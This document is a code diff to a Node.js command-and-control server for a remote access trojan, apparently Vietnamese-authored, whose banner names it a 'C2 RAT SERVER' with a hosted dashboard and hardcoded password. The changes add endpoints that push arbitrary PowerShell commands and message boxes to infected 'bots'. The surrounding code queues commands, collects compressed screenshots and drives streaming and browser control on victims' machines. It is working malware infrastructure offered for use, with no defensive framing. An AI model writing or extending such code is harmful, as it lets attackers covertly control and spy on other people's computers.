@@ -10,7 +10,14 @@ const sharp = require('sharp');
 
 const app = express();
 const server = http.createServer(app);
-const wss = new WebSocket.Server({ server });
+
+// ============================================================
+//  WEBSOCKET VỚI PATH /ws
+// ============================================================
+const wss = new WebSocket.Server({ 
+    server,
+    path: '/ws'
+});
 
 app.use(cors());
 app.use(bodyParser.json({ limit: '50mb' }));
@@ -113,12 +120,13 @@ const auth = (req, res, next) => {
 };
 
 // ============================================================
-//  WEBSOCKET
+//  WEBSOCKET HANDLER
 // ============================================================
 const botClients = new Map();
 
 wss.on('connection', (ws, req) => {
     const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '0.0.0.0';
+    console.log(`[WS] 🔗 New connection from ${clientIp}`);
     
     ws.on('message', async (message) => {
         try {
@@ -149,13 +157,15 @@ wss.on('connection', (ws, req) => {
                 await saveDB();
 
                 const pendings = DB.pending_commands.filter(p => p.bot_id === botId);
-                pendings.forEach(p => {
-                    sendCommand(ws, botId, p.cmd_id, p.command, JSON.parse(p.args || '[]'));
-                });
-                DB.pending_commands = DB.pending_commands.filter(p => p.bot_id !== botId);
-                await saveDB();
+                if (pendings.length > 0) {
+                    pendings.forEach(p => {
+                        sendCommand(ws, botId, p.cmd_id, p.command, JSON.parse(p.args || '[]'));
+                    });
+                    DB.pending_commands = DB.pending_commands.filter(p => p.bot_id !== botId);
+                    await saveDB();
+                }
 
-                console.log(`[BOT] Registered: ${botId}`);
+                console.log(`[BOT] ✅ Registered: ${botId}`);
                 ws.send(JSON.stringify({ type: 'registered', bot_id: botId }));
             }
 
@@ -167,38 +177,32 @@ wss.on('connection', (ws, req) => {
                 }
             }
 
-            // === RESULT - VỚI NÉN ẢNH ===
             else if (data.type === 'result') {
-                console.log(`[RESULT] ${botId}: ${data.cmd_id} -> ${data.status}`);
+                console.log(`[RESULT] 📥 ${botId}: ${data.cmd_id} -> ${data.status}`);
                 
                 let resultData = data.result;
                 
-                // NÉN ẢNH NẾU LÀ SCREENSHOT
                 if (data.result && data.result.startsWith('data:image')) {
                     try {
                         const base64Data = data.result.replace(/^data:image\/jpeg;base64,/, '');
                         const buffer = Buffer.from(base64Data, 'base64');
-                        
                         const compressed = await sharp(buffer)
                             .resize(800, null, { fit: 'inside' })
                             .jpeg({ quality: 40 })
                             .toBuffer();
-                        
                         const compressedBase64 = compressed.toString('base64');
                         resultData = `data:image/jpeg;base64,${compressedBase64}`;
-                        console.log(`[RESULT] ✅ Nén ảnh: ${(buffer.length / 1024).toFixed(1)}KB -> ${(compressed.length / 1024).toFixed(1)}KB`);
+                        console.log(`[RESULT] 🖼️ Nén ảnh: ${(buffer.length / 1024).toFixed(1)}KB -> ${(compressed.length / 1024).toFixed(1)}KB`);
                     } catch (e) {
                         console.log(`[RESULT] ⚠️ Lỗi nén ảnh: ${e.message}`);
                     }
                 }
                 
-                // LƯU VÀO DB
                 let cmdIndex = DB.commands.findIndex(c => c.cmd_id === data.cmd_id);
                 if (cmdIndex !== -1) {
                     DB.commands[cmdIndex].result = resultData;
                     DB.commands[cmdIndex].status = data.status || 'ok';
                     DB.commands[cmdIndex].executed_at = Date.now();
-                    console.log(`[RESULT] ✅ Updated command ${data.cmd_id}`);
                 } else {
                     DB.commands.push({
                         bot_id: botId,
@@ -210,7 +214,6 @@ wss.on('connection', (ws, req) => {
                         issued_at: Date.now(),
                         executed_at: Date.now()
                     });
-                    console.log(`[RESULT] ⚠️ Created new command ${data.cmd_id}`);
                 }
                 await saveDB();
                 
@@ -249,7 +252,7 @@ wss.on('connection', (ws, req) => {
                     bot.online = 0;
                     await saveDB();
                 }
-                console.log(`[BOT] Disconnected: ${id}`);
+                console.log(`[BOT] ❌ Disconnected: ${id}`);
                 break;
             }
         }
@@ -262,10 +265,10 @@ function sendCommand(ws, botId, cmdId, command, args = []) {
             type: 'command',
             payload: { cmd_id: cmdId, command, args }
         }));
-        console.log(`[CMD] Sent to ${botId}: ${command} (${cmdId})`);
+        console.log(`[CMD] 📤 Sent to ${botId}: ${command} (${cmdId})`);
         return true;
     } else {
-        console.log(`[CMD] Bot ${botId} not online, queuing`);
+        console.log(`[CMD] ⚠️ Bot ${botId} not online, queuing`);
         return false;
     }
 }
@@ -297,6 +300,7 @@ app.post('/api/command', auth, async (req, res) => {
     }
 
     const cmdId = Date.now() + '-' + crypto.randomBytes(4).toString('hex');
+    console.log(`[API] 📝 New command: ${command} for ${bot_id} (${cmdId})`);
     
     DB.commands.push({
         bot_id: bot_id,
@@ -327,133 +331,88 @@ app.post('/api/command', auth, async (req, res) => {
     }
 });
 
-app.post('/api/command/bulk', auth, async (req, res) => {
-    const { bot_ids, command, args = [] } = req.body;
-    if (!bot_ids || !Array.isArray(bot_ids) || bot_ids.length === 0) {
-        return res.status(400).json({ error: 'Missing bot_ids array' });
+// ============================================================
+//  SHELL API - MỚI
+// ============================================================
+app.post('/api/command/shell', auth, async (req, res) => {
+    const { bot_id, command } = req.body;
+    if (!bot_id || !command) {
+        return res.status(400).json({ error: 'Missing bot_id or command' });
     }
 
-    const results = [];
-    for (const botId of bot_ids) {
-        const cmdId = Date.now() + '-' + crypto.randomBytes(4).toString('hex');
-        DB.commands.push({
-            bot_id: botId,
-            cmd_id: cmdId,
-            command: command,
-            args: JSON.stringify(args),
-            result: null,
-            status: 'pending',
-            issued_at: Date.now(),
-            executed_at: null
-        });
-        
-        const ws = botClients.get(botId);
-        if (ws && ws.readyState === WebSocket.OPEN) {
-            sendCommand(ws, botId, cmdId, command, args);
-            results.push({ bot_id: botId, status: 'sent', cmd_id: cmdId });
-        } else {
-            DB.pending_commands.push({
-                bot_id: botId,
-                cmd_id: cmdId,
-                command: command,
-                args: JSON.stringify(args),
-                issued_at: Date.now()
-            });
-            results.push({ bot_id: botId, status: 'queued', cmd_id: cmdId });
-        }
-    }
+    const cmdId = Date.now() + '-' + crypto.randomBytes(4).toString('hex');
+    
+    DB.commands.push({
+        bot_id: bot_id,
+        cmd_id: cmdId,
+        command: `ps ${command}`,
+        args: JSON.stringify([]),
+        result: null,
+        status: 'pending',
+        issued_at: Date.now(),
+        executed_at: null
+    });
     await saveDB();
-    res.json({ results });
-});
 
-// ============================================================
-//  API /api/results/:cmd_id - FIXED
-// ============================================================
-app.get('/api/results/:cmd_id', auth, (req, res) => {
-    const cmdId = req.params.cmd_id;
-    console.log(`[API] Looking for result: ${cmdId}`);
-    
-    try {
-        // Tìm trong commands
-        let cmd = DB.commands.find(c => c.cmd_id === cmdId);
-        if (cmd) {
-            console.log(`[API] Found result: ${cmd.status}`);
-            return res.json({
-                cmd_id: cmd.cmd_id,
-                result: cmd.result || null,
-                status: cmd.status || 'pending',
-                issued_at: cmd.issued_at || Date.now(),
-                executed_at: cmd.executed_at || null,
-                command: cmd.command || 'unknown'
-            });
-        }
-        
-        // Tìm trong pending commands (fallback)
-        const pending = DB.pending_commands.find(p => p.cmd_id === cmdId);
-        if (pending) {
-            console.log(`[API] Found in pending`);
-            return res.json({
-                cmd_id: pending.cmd_id,
-                result: null,
-                status: 'pending',
-                issued_at: pending.issued_at,
-                executed_at: null,
-                command: pending.command || 'unknown'
-            });
-        }
-        
-        console.log(`[API] Command ${cmdId} not found`);
-        res.json({
+    const ws = botClients.get(bot_id);
+    if (ws && ws.readyState === WebSocket.OPEN) {
+        sendCommand(ws, bot_id, cmdId, `ps ${command}`, []);
+        res.json({ status: 'sent', cmd_id: cmdId });
+    } else {
+        DB.pending_commands.push({
+            bot_id: bot_id,
             cmd_id: cmdId,
-            result: null,
-            status: 'not_found',
-            issued_at: Date.now(),
-            executed_at: null,
-            command: 'unknown'
+            command: `ps ${command}`,
+            args: JSON.stringify([]),
+            issued_at: Date.now()
         });
-    } catch (error) {
-        console.error(`[API] Error: ${error.message}`);
-        res.status(500).json({ 
-            error: 'Internal server error', 
-            message: error.message 
-        });
+        await saveDB();
+        res.json({ status: 'queued', cmd_id: cmdId });
     }
 });
 
-app.get('/api/results/latest/:bot_id', auth, (req, res) => {
-    const botId = req.params.bot_id;
-    
-    const cached = streamCache.get(botId);
-    if (cached && cached.frame) {
-        return res.json({
-            cmd_id: 'stream-latest',
-            result: cached.frame,
-            status: 'ok',
-            executed_at: cached.timestamp
-        });
+// ============================================================
+//  MESSAGEBOX API - MỚI
+// ============================================================
+app.post('/api/messagebox', auth, async (req, res) => {
+    const { bot_id, title, message, button } = req.body;
+    if (!bot_id || !message) {
+        return res.status(400).json({ error: 'Missing bot_id or message' });
     }
+
+    const cmdId = Date.now() + '-' + crypto.randomBytes(4).toString('hex');
+    const titleEncoded = title || 'Thông báo';
+    const buttonEncoded = button || 'OK';
     
-    const cmds = DB.commands
-        .filter(c => c.bot_id === botId && c.command === 'sc')
-        .sort((a, b) => (b.executed_at || 0) - (a.executed_at || 0));
+    const psCommand = `Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('${message.replace(/'/g, "''")}', '${titleEncoded.replace(/'/g, "''")}', '${buttonEncoded}')`;
     
-    res.json(cmds[0] || {});
-});
+    DB.commands.push({
+        bot_id: bot_id,
+        cmd_id: cmdId,
+        command: `ps ${psCommand}`,
+        args: JSON.stringify([]),
+        result: null,
+        status: 'pending',
+        issued_at: Date.now(),
+        executed_at: null
+    });
+    await saveDB();
 
-app.get('/api/history/:bot_id', auth, (req, res) => {
-    const history = DB.commands
-        .filter(c => c.bot_id === req.params.bot_id)
-        .sort((a, b) => b.issued_at - a.issued_at)
-        .slice(0, 50);
-    res.json(history);
-});
-
-app.get('/api/commands', auth, (req, res) => {
-    res.json(DB.commands);
-});
-
-app.get('/api/pending', auth, (req, res) => {
-    res.json(DB.pending_commands);
+    const ws = botClients.get(bot_id);
+    if (ws && ws.readyState === WebSocket.OPEN) {
+        sendCommand(ws, bot_id, cmdId, `ps ${psCommand}`, []);
+        res.json({ status: 'sent', cmd_id: cmdId });
+    } else {
+        DB.pending_commands.push({
+            bot_id: bot_id,
+            cmd_id: cmdId,
+            command: `ps ${psCommand}`,
+            args: JSON.stringify([]),
+            issued_at: Date.now()
+        });
+        await saveDB();
+        res.json({ status: 'queued', cmd_id: cmdId });
+    }
 });
 
 // ============================================================
@@ -519,6 +478,9 @@ app.post('/api/rat/event', auth, (req, res) => {
     } else if (event_type === 'browser') {
         command = 'rat_browser';
         args = [url || 'https://www.google.com'];
+    } else if (event_type === 'messagebox') {
+        command = 'rat_messagebox';
+        args = [text || 'Thông báo', url || 'OK'];
     }
 
     sendCommand(ws, bot_id, cmdId, command, args);
@@ -536,6 +498,95 @@ app.get('/api/rat/stream/:bot_id', auth, (req, res) => {
     const cmdId = Date.now() + '-' + crypto.randomBytes(4).toString('hex');
     sendCommand(ws, botId, cmdId, 'rat_stream', []);
     res.json({ status: 'stream_started', bot_id: botId });
+});
+
+// ============================================================
+//  RESULTS API
+// ============================================================
+
+app.get('/api/results/:cmd_id', auth, (req, res) => {
+    const cmdId = req.params.cmd_id;
+    console.log(`[API] 🔍 Looking for result: ${cmdId}`);
+    
+    try {
+        let cmd = DB.commands.find(c => c.cmd_id === cmdId);
+        if (cmd) {
+            console.log(`[API] ✅ Found result: ${cmd.status}`);
+            return res.json({
+                cmd_id: cmd.cmd_id,
+                result: cmd.result || null,
+                status: cmd.status || 'pending',
+                issued_at: cmd.issued_at || Date.now(),
+                executed_at: cmd.executed_at || null,
+                command: cmd.command || 'unknown'
+            });
+        }
+        
+        const pending = DB.pending_commands.find(p => p.cmd_id === cmdId);
+        if (pending) {
+            console.log(`[API] ⏳ Found in pending`);
+            return res.json({
+                cmd_id: pending.cmd_id,
+                result: null,
+                status: 'pending',
+                issued_at: pending.issued_at,
+                executed_at: null,
+                command: pending.command || 'unknown'
+            });
+        }
+        
+        console.log(`[API] ❌ Command ${cmdId} not found`);
+        res.json({
+            cmd_id: cmdId,
+            result: null,
+            status: 'not_found',
+            issued_at: Date.now(),
+            executed_at: null,
+            command: 'unknown'
+        });
+    } catch (error) {
+        console.error(`[API] ❌ Error: ${error.message}`);
+        res.status(500).json({ 
+            error: 'Internal server error', 
+            message: error.message 
+        });
+    }
+});
+
+app.get('/api/results/latest/:bot_id', auth, (req, res) => {
+    const botId = req.params.bot_id;
+    
+    const cached = streamCache.get(botId);
+    if (cached && cached.frame) {
+        return res.json({
+            cmd_id: 'stream-latest',
+            result: cached.frame,
+            status: 'ok',
+            executed_at: cached.timestamp
+        });
+    }
+    
+    const cmds = DB.commands
+        .filter(c => c.bot_id === botId && c.command === 'sc')
+        .sort((a, b) => (b.executed_at || 0) - (a.executed_at || 0));
+    
+    res.json(cmds[0] || {});
+});
+
+app.get('/api/history/:bot_id', auth, (req, res) => {
+    const history = DB.commands
+        .filter(c => c.bot_id === req.params.bot_id)
+        .sort((a, b) => b.issued_at - a.issued_at)
+        .slice(0, 50);
+    res.json(history);
+});
+
+app.get('/api/commands', auth, (req, res) => {
+    res.json(DB.commands);
+});
+
+app.get('/api/pending', auth, (req, res) => {
+    res.json(DB.pending_commands);
 });
 
 // ============================================================
@@ -606,10 +657,11 @@ async function startServer() {
     
     server.listen(PORT, '0.0.0.0', () => {
         console.log('='.repeat(50));
-        console.log('  ✅ C2 RAT SERVER STARTED (FIXED)');
+        console.log('  ✅ C2 RAT SERVER STARTED');
         console.log(`  Port: ${PORT}`);
-        console.log(`  Dashboard: http://localhost:${PORT}/`);
-        console.log(`  RAT Control: http://localhost:${PORT}/rat`);
+        console.log(`  WebSocket Path: /ws`);
+        console.log(`  Dashboard: https://c2-server-exj9.onrender.com/`);
+        console.log(`  RAT Control: https://c2-server-exj9.onrender.com/rat`);
         console.log(`  Password: H3XTEK0`);
         console.log(`  Gist: ${gistEnabled ? '✅ Enabled' : '❌ Disabled'}`);
         console.log('='.repeat(50));
